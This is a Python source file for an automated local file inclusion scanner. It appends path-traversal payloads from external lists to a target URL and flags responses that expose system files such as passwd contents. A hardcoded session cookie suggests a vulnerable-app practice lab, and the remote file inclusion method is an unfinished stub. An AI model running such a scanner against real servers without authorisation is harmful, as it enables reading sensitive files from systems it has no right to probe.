import os
from pathlib import Path
import requests
from urllib.parse import urljoin, urlencode
from modules.txtReader import TxtReader
from progress.bar import Bar
from termcolor import colored
import yaml

class xfiController():

    def lfi(self, config):
        self.lfiPayload = TxtReader.load_file(os.path.join(os.path.dirname(__file__), '../ressources/lfi_payload_ligth.txt'))
        if config['lfimode']!='LIGHT':
            self.lfiPayload = TxtReader.load_file(os.path.join(os.path.dirname(__file__), '../ressources/lfi_payloads.txt')) 
        print(colored('\n\n[^_^] xfi START CHECK LFI PAYLOAD IN', 'yellow'), colored('{0} MODE \n'.format(config['lfimode']), 'green' if config['lfimode']=='LIGHT' else 'red'))
        sizeBar = Bar('Processing', max= len(self.lfiPayload), suffix='%(percent)d%%')
        goodPayload = []
        for payload in self.lfiPayload:
            full_url = config['url'] + payload
            try:
                response = requests.get(full_url, cookies={"PHPSESSID":"bofs3jjtfnghtmhnqp2324vnk5", "security":"low"})
                if response.status_code == 200 and ('root' in response.text or 'open_basedir' in response.text):
                    goodPayload.append(full_url)
                elif response.status_code == 403:
                    print("[x] It seem like you need to configure 'xfi' to run on auth mode")
                else:
                    if payload == self.lfiPayload[len(self.lfiPayload)-1]: print(colored("\n\n[X] Something don't work properly...", 'grey'), colored(full_url  +'\n', 'red'))
            except requests.RequestException as e:
                print(f'[!] Error testing payload {payload}: {e}')
            sizeBar.next()
        sizeBar.finish()
        if len(goodPayload) > 0:
            with open('results.yml', 'w') as outfile:
                yaml.dump(goodPayload, outfile, default_flow_style=False, sort_keys=False)
            print(colored('\n\n[!] Potential LFI payload(s)', 'green'))
            if len(goodPayload) > 3:
                for payload in goodPayload[:3]:
                    print(colored('~ Link:', 'yellow'), colored(payload, 'blue'))
            else:
                print(colored('~ Link:', 'yellow'), colored(goodPayload[0], 'blue'))
            print(colored("\n\n> Checking complete, you can find more results on : {0} file".format(Path('results.yml').resolve()), 'yellow'))
        else:
            print(colored('\n\n[x] We found 0 LFI Payload on this web server', 'red'))


    def rfi(self):
        print(self.rfiPayload)        
        # if response.status_code == 200 and 'malicious' in response.text:
        #     print(f'[!] Potential RFI vulnerability detected with payload: {payload}')

        